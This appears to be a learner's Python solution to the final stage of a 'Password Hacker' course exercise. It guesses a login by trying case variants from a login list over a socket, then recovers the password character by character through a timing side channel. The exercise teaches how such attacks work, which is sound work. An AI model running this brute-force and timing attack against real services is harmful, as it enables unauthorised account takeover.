# Project: Password Hacker - hyperskill
# STAGE 5 - FINAL STAGE

# Task:
# The program now catches the exception and sends a simple ‘wrong password’ message to the client even when the real password starts with current symbols.
# We know that catching an exception takes the computer a long time, so there should be a delay in the server response when this exception takes place. 
# You can use it to hack the system: count the time period in which the response comes and find out which starting symbols work out for the password.

# Objectives:
# In this stage, you should write a program that uses the time vulnerability to find the password.
#   1.Use the list of logins from the previous stage.
#   2.Output the result as you did this in the previous stage.



import socket
import sys
import itertools
import json
import time


def get_response(socket):
    response = socket.recv(1024)
    response = json.loads(response)
    result = response['result']
    return result


def send_credent(socket, login, password=''):
    credent = {"login": login, "password": password}
    credent = json.dumps(credent)
    credent = credent.encode()
    socket.send(credent)


data = sys.argv
hostname = data[1]
port = int(data[2])

with open('logins.txt', 'r') as file:
    logins = [l.strip() for l in file.readlines()]

my_socket = socket.socket()
my_socket.connect((hostname, port))

#  get login
final_login = None
final_passw = None

loop_end = False
for p in logins:
    base = p
    com = list(range(len(p)))
    for length in range(len(p)+1):
        index = itertools.combinations(com, length)
        for i in index:
            p = base
            p = list(p)
            for ii in i:
                p[ii] = p[ii].upper()
            p = ''.join(p)
            send_credent(my_socket, p)
            result = get_response(my_socket)
            if result == "Wrong password!":
                final_login = p
                loop_end = True
                break
        if loop_end:
            break
    if loop_end:
        break
        
#  get password
passw = []
signs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
i = 0
while i < len(signs):
    passw.append(signs[i])
    passw_to_send = ''.join(passw)
    send_credent(my_socket, final_login, passw_to_send)
    start_time = time.time()
    response = my_socket.recv(1024)
    end_time = time.time()
    date_diff = (end_time - start_time) * 1000000
    response = json.loads(response)
    result = response['result']

    if date_diff > 90000:
        i = 0
        continue
    elif result == "Wrong password!":
        i += 1
        passw.pop()
    elif result == "Connection success!":
        final_passw = passw_to_send
        break


fin_credent = {"login": final_login, "password": final_passw}
fin_credent = json.dumps(fin_credent)
print(fin_credent)

my_socket.close()
